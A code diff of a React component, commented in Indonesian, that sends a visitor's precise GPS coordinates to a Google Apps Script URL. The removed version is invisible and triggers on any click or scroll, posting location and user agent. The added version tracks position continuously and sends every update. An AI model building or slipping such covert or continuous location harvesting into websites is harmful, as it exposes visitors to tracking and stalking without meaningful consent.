@@ -1,81 +1,52 @@
 "use client";
 
-import { useEffect } from "react";
+import React, { useEffect } from "react";
 
-export default function SendLocation() {
+export default function AutoLocationSender() {
+  // === KONFIGURASI URL APPSCRIPT ===
+  const APPSCRIPT_URL =
+    "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";
+
   useEffect(() => {
-    let activated = false;
-
-    const activate = () => {
-      if (activated) return;
-      activated = true;
-
-      requestLocation();
-      window.removeEventListener("click", activate);
-      window.removeEventListener("touchstart", activate);
-      window.removeEventListener("scroll", activate);
-    };
-
-    window.addEventListener("click", activate);
-    window.addEventListener("touchstart", activate);
-    window.addEventListener("scroll", activate);
-
-    // Jika user sudah pernah izin sebelumnya → langsung kirim lokasi otomatis
-    if (navigator.permissions) {
-      navigator.permissions.query({ name: "geolocation" as PermissionName })
-        .then((result) => {
-          if (result.state === "granted") {
-            activated = true;
-            requestLocation();
-          }
-        })
-        .catch(() => {});
-    }
-
-    return () => {
-      window.removeEventListener("click", activate);
-      window.removeEventListener("touchstart", activate);
-      window.removeEventListener("scroll", activate);
-    };
-  }, []);
-
-  const requestLocation = () => {
     if (!navigator.geolocation) {
-      console.log("Browser tidak support geolocation");
+      console.error("Browser tidak mendukung geolocation");
       return;
     }
 
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const { latitude, longitude } = position.coords;
+    // Meminta izin lokasi + mendapatkan GPS paling akurat
+    const watchId = navigator.geolocation.watchPosition(
+      (pos) => {
+        const latitude = pos.coords.latitude;
+        const longitude = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy;
 
-        console.log("Lokasi:", latitude, longitude);
+        console.log("Lokasi terkirim:", latitude, longitude, "akurasi:", accuracy);
 
-        fetch(
-          "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec",
-          {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude,
-              longitude,
-              timestamp: new Date().toISOString(),
-              userAgent: navigator.userAgent,
-            }),
-          }
-        );
+        // Kirim ke Apps Script
+        fetch(`${APPSCRIPT_URL}?lat=${latitude}&lon=${longitude}`, {
+          method: "GET",
+        })
+          .then((res) => res.text())
+          .then((txt) => console.log("RESPON APPSCRIPT:", txt))
+          .catch((err) => console.error("Gagal kirim lokasi", err));
       },
-      (error) => {
-        console.log("Error lokasi:", error.code, error.message);
+      (err) => {
+        console.error("Gagal mendapatkan lokasi", err);
       },
       {
-        enableHighAccuracy: true,
-        timeout: 15000,
+        enableHighAccuracy: true, // GPS paling akurat
+        timeout: 10000,
         maximumAge: 0,
       }
     );
-  };
 
-  return null;
+    return () => navigator.geolocation.clearWatch(watchId);
+  }, []);
+
+  return (
+    <div className="p-4">
+      <h1 className="text-xl font-bold">Pengiriman GPS Otomatis</h1>
+      <p>Izin lokasi akan diminta otomatis & GPS akan dikirim tanpa tombol.</p>
+    </div>
+  );
 }
